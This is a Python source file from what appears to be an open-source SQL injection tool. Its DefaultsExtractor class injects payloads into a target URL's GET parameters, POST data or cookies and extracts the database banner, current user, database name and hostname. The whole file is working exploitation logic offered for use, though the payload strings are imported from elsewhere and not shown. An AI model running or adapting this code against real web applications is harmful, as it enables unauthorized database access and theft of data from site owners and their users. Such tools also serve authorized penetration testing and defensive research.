#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
from xpath.common.payloads import (
    PAYLOADS_BANNER,
    PAYLOADS_HOSTNAME,
    PAYLOADS_CURRENT_USER,
    PAYLOADS_CURRENT_DATABASE,
)
from xpath.injector.request import request
from xpath.logger.colored_logger import logger
from xpath.common.lib import compat_urlencode, collections
from xpath.common.utils import prepare_injection_payload


class DefaultsExtractor(object):
    def __init__(
        self,
        url,
        data="",
        payload="",
        regex="",
        cookies="",
        injected_param="",
        session_filepath="",
    ):
        self.url = url
        self.data = data
        self.payload = payload.replace("0x72306f746833783439", "{banner}")
        self.cookies = cookies
        self.regex = regex
        self._injected_param = injected_param
        self.session_filepath = session_filepath

    def _perpare_querystring(self, text, payload):
        payload = compat_urlencode(payload)
        payload = prepare_injection_payload(
            text=text, payload=payload, param=self._injected_param
        )
        return payload

    def _generat_payload(self, payloads_list):
        payloads = []
        for p in payloads_list:
            payload = self.payload.format(banner=p)
            payloads.append(payload)
        return payloads

    @property
    def banner(self):
        payloads = self._generat_payload(payloads_list=PAYLOADS_BANNER)
        logger.info("fetching banner")
        retval = self._extact(payloads=payloads)
        if retval.is_injected:
            logger.info("retrieved: '%s'" % (retval.result))
            logger.success(f"banner: '{retval.result}'")
        else:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                logger.warning("HTTP error codes detected during run:")
                message = f"{error} - {count} times"
                logger.http_error(message)
            else:
                message = (
                    f"tested with '{count}' queries, unable to find working SQL query."
                )
                logger.critical(message)
        return retval

    @property
    def user(self):
        payloads = self._generat_payload(payloads_list=PAYLOADS_CURRENT_USER)
        logger.info("fetching current user")
        retval = self._extact(payloads=payloads)
        if retval.is_injected:
            logger.info("retrieved: '%s'" % (retval.result))
            logger.success(f"current user: '{retval.result}'")
        else:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                logger.warning("HTTP error codes detected during run:")
                message = f"{error} - {count} times"
                logger.http_error(message)
            else:
                message = (
                    f"tested with '{count}' queries, unable to find working SQL query."
                )
                logger.critical(message)
        return retval

    @property
    def database(self):
        payloads = self._generat_payload(payloads_list=PAYLOADS_CURRENT_DATABASE)
        logger.info("fetching current database")
        retval = self._extact(payloads=payloads)
        if retval.is_injected:
            logger.info("retrieved: '%s'" % (retval.result))
            logger.success(f"current database: '{retval.result}'")
        else:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                logger.warning("HTTP error codes detected during run:")
                message = f"{error} - {count} times"
                logger.http_error(message)
            else:
                message = (
                    f"tested with '{count}' queries, unable to find working SQL query."
                )
                logger.critical(message)
        return retval

    @property
    def hostname(self):
        payloads = self._generat_payload(payloads_list=PAYLOADS_HOSTNAME)
        logger.info("fetching hostname")
        retval = self._extact(payloads=payloads)
        if retval.is_injected:
            logger.info("retrieved: '%s'" % (retval.result))
            logger.success(f"hostname: '{retval.result}'")
        else:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                logger.warning("HTTP error codes detected during run:")
                message = f"{error} - {count} times"
                logger.http_error(message)
            else:
                message = (
                    f"tested with '{count}' queries, unable to find working SQL query."
                )
                logger.critical(message)
        return retval

    def _extact(self, payloads):

        PayloadResponse = collections.namedtuple(
            "PayloadResponse",
            [
                "is_injected",
                "status_code",
                "result",
                "payload",
                "payloads_count",
                "error",
            ],
        )
        payloads_count = len(payloads)
        status_code = None
        error = None
        for p in payloads:
            url = self.url
            data = self.data
            regex = self.regex
            cookies = self.cookies
            if self.url and not self.data and not self.cookies:
                # GET
                url = self._perpare_querystring(self.url, p)
            if self.url and self.data and not self.cookies:
                # POST
                data = self._perpare_querystring(self.data, p)
            if self.url and not self.data and self.cookies:
                # COOKIES
                cookies = self._perpare_querystring(self.cookies, p)
            try:
                response = request.inject_payload(
                    url=url, regex=regex, data=data, cookies=cookies
                )
            except Exception as e:
                logger.error(str(e))
            else:
                if response.ok:
                    result = response.result
                    status_code = response.status_code
                    error = response.error
                    return PayloadResponse(
                        is_injected=True,
                        status_code=status_code,
                        result=result,
                        payload=p,
                        payloads_count=payloads_count,
                        error=error,
                    )
                else:
                    status_code = response.status_code
                    error = response.error
        return PayloadResponse(
            is_injected=False,
            status_code=status_code,
            result="",
            payload="",
            payloads_count=payloads_count,
            error=error,
        )
